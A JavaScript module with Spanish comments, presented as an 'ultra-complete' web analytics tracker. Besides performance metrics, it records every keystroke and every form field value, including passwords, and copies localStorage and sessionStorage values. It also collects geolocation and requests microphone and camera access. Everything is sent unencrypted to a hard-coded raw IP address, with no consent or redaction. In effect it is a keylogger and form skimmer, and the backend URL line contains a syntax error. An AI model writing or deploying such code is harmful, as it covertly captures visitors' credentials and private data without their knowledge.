/**
 * SISTEMA DE TRACKING ULTRA-COMPLETO
 * Captura ABSOLUTAMENTE TODO lo que pasa en la página web
 */

class CompleteTrackingSystem {
  constructor() {
    this.sessionId = this.generateSessionId();
    this.startTime = Date.now();
    this.isTracking = false;
    this.backendUrl = 'http://92.186.17.227:5001'\;
    
    // Métricas de rendimiento
    this.performanceMetrics = {
      fps: [],
      memory: [],
      cpu: [],
      network: [],
      scroll: [],
      interactions: []
    };
    
    // Contadores
    this.counters = {
      clicks: 0,
      scrolls: 0,
      keypresses: 0,
      mouseMoves: 0,
      touches: 0,
      formInteractions: 0,
      errors: 0,
      apiCalls: 0
    };
    
    // Timestamps
    this.timestamps = {
      pageLoad: Date.now(),
      lastInteraction: Date.now(),
      lastScroll: Date.now(),
      lastClick: Date.now()
    };
  }

  // Generar ID único de sesión
  generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  }

  // Inicializar el sistema completo
  init() {
    if (this.isTracking) return;
    
    console.log('🚀 Iniciando sistema de tracking ultra-completo...');
    this.isTracking = true;
    
    // 1. TRACKING DE RENDIMIENTO
    this.initPerformanceTracking();
    
    // 2. TRACKING DE INTERACCIONES
    this.initInteractionTracking();
    
    // 3. TRACKING DE SCROLL
    this.initScrollTracking();
    
    // 4. TRACKING DE MEMORIA Y CPU
    this.initResourceTracking();
    
    // 5. TRACKING DE RED
    this.initNetworkTracking();
    
    // 6. TRACKING DE ERRORES
    this.initErrorTracking();
    
    // 7. TRACKING DE FORMULARIOS
    this.initFormTracking();
    
    // 8. TRACKING DE NAVEGACIÓN
    this.initNavigationTracking();
    
    // 9. TRACKING DE VISIBILIDAD
    this.initVisibilityTracking();
    
    // 10. TRACKING DE ORIENTACIÓN
    this.initOrientationTracking();
    
    // 11. TRACKING DE BATTERÍA
    this.initBatteryTracking();
    
    // 12. TRACKING DE CONECTIVIDAD
    this.initConnectivityTracking();
    
    // 13. TRACKING DE GEOLOCALIZACIÓN
    this.initGeolocationTracking();
    
    // 14. TRACKING DE ACCELERÓMETRO
    this.initAccelerometerTracking();
    
    // 15. TRACKING DE GYROSCOPIO
    this.initGyroscopeTracking();
    
    // 16. TRACKING DE MICRÓFONO
    this.initMicrophoneTracking();
    
    // 17. TRACKING DE CÁMARA
    this.initCameraTracking();
    
    // 18. TRACKING DE NOTIFICACIONES
    this.initNotificationTracking();
    
    // 19. TRACKING DE PERMISOS
    this.initPermissionTracking();
    
    // 20. TRACKING DE STORAGE
    this.initStorageTracking();
    
    // Enviar datos cada 5 segundos
    this.startPeriodicSending();
    
    console.log('✅ Sistema de tracking ultra-completo iniciado');
  }

  // 1. TRACKING DE RENDIMIENTO
  initPerformanceTracking() {
    // FPS tracking
    let frameCount = 0;
    let lastTime = performance.now();
    
    const measureFPS = () => {
      frameCount++;
      const currentTime = performance.now();
      
      if (currentTime - lastTime >= 1000) {
        const fps = Math.round((frameCount * 1000) / (currentTime - lastTime));
        this.performanceMetrics.fps.push({
          fps,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
        
        frameCount = 0;
        lastTime = currentTime;
      }
      
      requestAnimationFrame(measureFPS);
    };
    
    requestAnimationFrame(measureFPS);
    
    // Core Web Vitals
    if ('PerformanceObserver' in window) {
      // LCP (Largest Contentful Paint)
      new PerformanceObserver((list) => {
        const entries = list.getEntries();
        const lastEntry = entries[entries.length - 1];
        this.trackEvent('lcp', {
          value: lastEntry.startTime,
          element: lastEntry.element?.tagName || 'unknown'
        });
      }).observe({ entryTypes: ['largest-contentful-paint'] });
      
      // FID (First Input Delay)
      new PerformanceObserver((list) => {
        const entries = list.getEntries();
        entries.forEach(entry => {
          this.trackEvent('fid', {
            value: entry.processingStart - entry.startTime,
            name: entry.name
          });
        });
      }).observe({ entryTypes: ['first-input'] });
      
      // CLS (Cumulative Layout Shift)
      new PerformanceObserver((list) => {
        let cls = 0;
        list.getEntries().forEach(entry => {
          if (!entry.hadRecentInput) {
            cls += entry.value;
          }
        });
        this.trackEvent('cls', { value: cls });
      }).observe({ entryTypes: ['layout-shift'] });
    }
  }

  // 2. TRACKING DE INTERACCIONES
  initInteractionTracking() {
    // Clicks
    document.addEventListener('click', (e) => {
      this.counters.clicks++;
      this.timestamps.lastClick = Date.now();
      
      this.trackEvent('click', {
        element: this.getElementInfo(e.target),
        position: { x: e.clientX, y: e.clientY },
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    }, true);
    
    // Mouse moves
    let mouseMoveTimeout;
    document.addEventListener('mousemove', (e) => {
      this.counters.mouseMoves++;
      this.timestamps.lastInteraction = Date.now();
      
      clearTimeout(mouseMoveTimeout);
      mouseMoveTimeout = setTimeout(() => {
        this.trackEvent('mouse_stop_moving', {
          position: { x: e.clientX, y: e.clientY },
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      }, 100);
    });
    
    // Keypresses
    document.addEventListener('keydown', (e) => {
      this.counters.keypresses++;
      this.timestamps.lastInteraction = Date.now();
      
      this.trackEvent('keypress', {
        key: e.key,
        code: e.code,
        ctrlKey: e.ctrlKey,
        shiftKey: e.shiftKey,
        altKey: e.altKey,
        metaKey: e.metaKey,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    // Touch events
    document.addEventListener('touchstart', (e) => {
      this.counters.touches++;
      this.timestamps.lastInteraction = Date.now();
      
      this.trackEvent('touch_start', {
        touches: e.touches.length,
        position: { x: e.touches[0].clientX, y: e.touches[0].clientY },
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    document.addEventListener('touchmove', (e) => {
      this.trackEvent('touch_move', {
        touches: e.touches.length,
        position: { x: e.touches[0].clientX, y: e.touches[0].clientY },
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    document.addEventListener('touchend', (e) => {
      this.trackEvent('touch_end', {
        touches: e.changedTouches.length,
        position: { x: e.changedTouches[0].clientX, y: e.changedTouches[0].clientY },
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
  }

  // 3. TRACKING DE SCROLL
  initScrollTracking() {
    let scrollTimeout;
    let scrollStartTime;
    let scrollDistance = 0;
    let scrollDirection = 'none';
    
    document.addEventListener('scroll', (e) => {
      this.counters.scrolls++;
      this.timestamps.lastScroll = Date.now();
      
      if (!scrollStartTime) {
        scrollStartTime = Date.now();
        scrollDirection = this.getScrollDirection();
      }
      
      scrollDistance += Math.abs(window.scrollY - (this.lastScrollY || 0));
      this.lastScrollY = window.scrollY;
      
      clearTimeout(scrollTimeout);
      scrollTimeout = setTimeout(() => {
        const scrollDuration = Date.now() - scrollStartTime;
        const scrollSpeed = scrollDistance / scrollDuration;
        
        this.performanceMetrics.scroll.push({
          direction: scrollDirection,
          distance: scrollDistance,
          duration: scrollDuration,
          speed: scrollSpeed,
          position: { x: window.scrollX, y: window.scrollY },
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
        
        this.trackEvent('scroll_complete', {
          direction: scrollDirection,
          distance: scrollDistance,
          duration: scrollDuration,
          speed: scrollSpeed,
          position: { x: window.scrollX, y: window.scrollY },
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
        
        // Reset
        scrollStartTime = null;
        scrollDistance = 0;
        scrollDirection = 'none';
      }, 150);
    });
  }

  // 4. TRACKING DE RECURSOS
  initResourceTracking() {
    // Memory usage
    if ('memory' in performance) {
      setInterval(() => {
        this.performanceMetrics.memory.push({
          usedJSHeapSize: performance.memory.usedJSHeapSize,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      }, 5000);
    }
    
    // CPU usage (aproximado)
    let lastTime = performance.now();
    let lastFrameTime = performance.now();
    
    const measureCPU = () => {
      const currentTime = performance.now();
      const frameTime = currentTime - lastFrameTime;
      const totalTime = currentTime - lastTime;
      
      if (totalTime >= 1000) {
        const cpuUsage = (frameTime / totalTime) * 100;
        this.performanceMetrics.cpu.push({
          usage: cpuUsage,
          frameTime: frameTime,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
        
        lastTime = currentTime;
      }
      
      lastFrameTime = currentTime;
      requestAnimationFrame(measureCPU);
    };
    
    requestAnimationFrame(measureCPU);
  }

  // 5. TRACKING DE RED
  initNetworkTracking() {
    if ('connection' in navigator) {
      const connection = navigator.connection;
      
      this.trackEvent('network_info', {
        effectiveType: connection.effectiveType,
        downlink: connection.downlink,
        rtt: connection.rtt,
        saveData: connection.saveData,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
      
      connection.addEventListener('change', () => {
        this.trackEvent('network_change', {
          effectiveType: connection.effectiveType,
          downlink: connection.downlink,
          rtt: connection.rtt,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      });
    }
  }

  // 6. TRACKING DE ERRORES
  initErrorTracking() {
    // JavaScript errors
    window.addEventListener('error', (e) => {
      this.counters.errors++;
      this.trackEvent('js_error', {
        message: e.message,
        filename: e.filename,
        lineno: e.lineno,
        colno: e.colno,
        error: e.error?.stack || 'unknown',
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    // Promise rejections
    window.addEventListener('unhandledrejection', (e) => {
      this.counters.errors++;
      this.trackEvent('promise_rejection', {
        reason: e.reason,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    // Resource loading errors
    window.addEventListener('error', (e) => {
      if (e.target !== window) {
        this.trackEvent('resource_error', {
          type: e.target.tagName,
          src: e.target.src || e.target.href,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      }
    }, true);
  }

  // 7. TRACKING DE FORMULARIOS
  initFormTracking() {
    document.addEventListener('focusin', (e) => {
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
        this.counters.formInteractions++;
        this.trackEvent('form_focus', {
          element: this.getElementInfo(e.target),
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      }
    });
    
    document.addEventListener('input', (e) => {
      if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT') {
        this.trackEvent('form_input', {
          element: this.getElementInfo(e.target),
          value: e.target.value,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      }
    });
    
    document.addEventListener('submit', (e) => {
      this.trackEvent('form_submit', {
        element: this.getElementInfo(e.target),
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
  }

  // 8. TRACKING DE NAVEGACIÓN
  initNavigationTracking() {
    // Page visibility
    document.addEventListener('visibilitychange', () => {
      this.trackEvent('visibility_change', {
        visible: !document.hidden,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    // Before unload
    window.addEventListener('beforeunload', () => {
      this.trackEvent('page_unload', {
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
    
    // Page load
    window.addEventListener('load', () => {
      this.trackEvent('page_loaded', {
        loadTime: Date.now() - this.timestamps.pageLoad,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    });
  }

  // 9. TRACKING DE VISIBILIDAD
  initVisibilityTracking() {
    // Intersection Observer para elementos visibles
    if ('IntersectionObserver' in window) {
      const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
          this.trackEvent('element_visibility', {
            element: this.getElementInfo(entry.target),
            isIntersecting: entry.isIntersecting,
            intersectionRatio: entry.intersectionRatio,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
      });
      
      // Observar todos los elementos
      document.querySelectorAll('*').forEach(el => {
        observer.observe(el);
      });
    }
  }

  // 10. TRACKING DE ORIENTACIÓN
  initOrientationTracking() {
    if ('onorientationchange' in window) {
      window.addEventListener('orientationchange', () => {
        this.trackEvent('orientation_change', {
          orientation: window.orientation,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      });
    }
  }

  // 11. TRACKING DE BATTERÍA
  initBatteryTracking() {
    if ('getBattery' in navigator) {
      navigator.getBattery().then(battery => {
        this.trackEvent('battery_info', {
          level: battery.level,
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
        
        battery.addEventListener('levelchange', () => {
          this.trackEvent('battery_level_change', {
            level: battery.level,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
        
        battery.addEventListener('chargingchange', () => {
          this.trackEvent('battery_charging_change', {
            charging: battery.charging,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
      });
    }
  }

  // 12. TRACKING DE CONECTIVIDAD
  initConnectivityTracking() {
    if ('onLine' in navigator) {
      this.trackEvent('connectivity_status', {
        online: navigator.onLine,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
      
      window.addEventListener('online', () => {
        this.trackEvent('connectivity_online', {
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      });
      
      window.addEventListener('offline', () => {
        this.trackEvent('connectivity_offline', {
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      });
    }
  }

  // 13. TRACKING DE GEOLOCALIZACIÓN
  initGeolocationTracking() {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition((position) => {
        this.trackEvent('geolocation_success', {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      }, (error) => {
        this.trackEvent('geolocation_error', {
          error: error.message,
          timestamp: Date.now(),
          sessionId: this.sessionId
        });
      });
    }
  }

  // 14. TRACKING DE ACCELERÓMETRO
  initAccelerometerTracking() {
    if ('Accelerometer' in window) {
      try {
        const accelerometer = new Accelerometer({ frequency: 60 });
        accelerometer.addEventListener('reading', () => {
          this.trackEvent('accelerometer_reading', {
            x: accelerometer.x,
            y: accelerometer.y,
            z: accelerometer.z,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
        accelerometer.start();
      } catch (error) {
        // No disponible
      }
    }
  }

  // 15. TRACKING DE GYROSCOPIO
  initGyroscopeTracking() {
    if ('Gyroscope' in window) {
      try {
        const gyroscope = new Gyroscope({ frequency: 60 });
        gyroscope.addEventListener('reading', () => {
          this.trackEvent('gyroscope_reading', {
            x: gyroscope.x,
            y: gyroscope.y,
            z: gyroscope.z,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
        gyroscope.start();
      } catch (error) {
        // No disponible
      }
    }
  }

  // 16. TRACKING DE MICRÓFONO
  initMicrophoneTracking() {
    if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          this.trackEvent('microphone_access', {
            granted: true,
            timestamp: Date.now(),
            sessionId: this.sessionId
      });
        })
        .catch(error => {
          this.trackEvent('microphone_access', {
            granted: false,
            error: error.message,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
    }
  }

  // 17. TRACKING DE CÁMARA
  initCameraTracking() {
    if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          this.trackEvent('camera_access', {
            granted: true,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        })
        .catch(error => {
          this.trackEvent('camera_access', {
            granted: false,
            error: error.message,
            timestamp: Date.now(),
            sessionId: this.sessionId
          });
        });
    }
  }

  // 18. TRACKING DE NOTIFICACIONES
  initNotificationTracking() {
    if ('Notification' in window) {
      this.trackEvent('notification_permission', {
        permission: Notification.permission,
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
    }
  }

  // 19. TRACKING DE PERMISOS
  initPermissionTracking() {
    if ('permissions' in navigator) {
      const permissions = ['camera', 'microphone', 'geolocation', 'notifications'];
      
      permissions.forEach(permission => {
        navigator.permissions.query({ name: permission })
          .then(result => {
            this.trackEvent('permission_status', {
              permission,
              state: result.state,
              timestamp: Date.now(),
              sessionId: this.sessionId
            });
          });
      });
    }
  }

  // 20. TRACKING DE STORAGE
  initStorageTracking() {
    // Local Storage
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function(key, value) {
      this.trackEvent('local_storage_set', {
        key,
        value: value.toString().substring(0, 100),
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
      originalSetItem.apply(this, arguments);
    }.bind(this);
    
    // Session Storage
    const originalSessionSetItem = sessionStorage.setItem;
    sessionStorage.setItem = function(key, value) {
      this.trackEvent('session_storage_set', {
        key,
        value: value.toString().substring(0, 100),
        timestamp: Date.now(),
        sessionId: this.sessionId
      });
      originalSessionSetItem.apply(this, arguments);
    }.bind(this);
  }

  // FUNCIONES AUXILIARES
  getElementInfo(element) {
    return {
      tagName: element.tagName,
      id: element.id,
      className: element.className,
      textContent: element.textContent?.substring(0, 100) || '',
      href: element.href || null,
      src: element.src || null,
      type: element.type || null,
      value: element.value || null,
      position: {
        x: element.offsetLeft,
        y: element.offsetTop,
        width: element.offsetWidth,
        height: element.offsetHeight
      }
    };
  }

  getScrollDirection() {
    const currentScroll = window.scrollY;
    if (currentScroll > (this.lastScrollY || 0)) {
      return 'down';
    } else if (currentScroll < (this.lastScrollY || 0)) {
      return 'up';
    }
    return 'none';
  }

  // Enviar datos al backend
  async trackEvent(eventType, eventData) {
    try {
      const payload = {
        eventType,
        eventData,
        timestamp: Date.now(),
        sessionId: this.sessionId,
        url: window.location.href,
        userAgent: navigator.userAgent,
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight
        }
      };
      
      // Enviar al backend
      fetch(`${this.backendUrl}/api/analytics/event`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      }).catch(error => {
        console.error('Error enviando evento:', error);
      });
      
    } catch (error) {
      console.error('Error en trackEvent:', error);
    }
  }

  // Enviar datos periódicamente
  startPeriodicSending() {
    setInterval(() => {
      this.sendCompleteData();
    }, 5000);
  }

  // Enviar datos completos
  async sendCompleteData() {
    try {
      const completeData = {
        sessionId: this.sessionId,
        timestamp: Date.now(),
        counters: this.counters,
        performanceMetrics: this.performanceMetrics,
        timestamps: this.timestamps,
        deviceInfo: {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          onLine: navigator.onLine,
          viewport: {
            width: window.innerWidth,
            height: window.innerHeight
          },
          screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
          }
        }
      };
      
      // Enviar al backend
      fetch(`${this.backendUrl}/api/analytics/user-actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(completeData)
      }).catch(error => {
        console.error('Error enviando datos completos:', error);
      });
      
    } catch (error) {
      console.error('Error en sendCompleteData:', error);
    }
  }

  // Detener tracking
  stop() {
    this.isTracking = false;
    console.log('🛑 Sistema de tracking detenido');
  }

  // Obtener estadísticas
  getStats() {
    return {
      sessionId: this.sessionId,
      startTime: this.startTime,
      duration: Date.now() - this.startTime,
      counters: this.counters,
      performanceMetrics: this.performanceMetrics,
      timestamps: this.timestamps
    };
  }
}

// Exportar instancia única
const completeTrackingSystem = new CompleteTrackingSystem();
export default completeTrackingSystem;
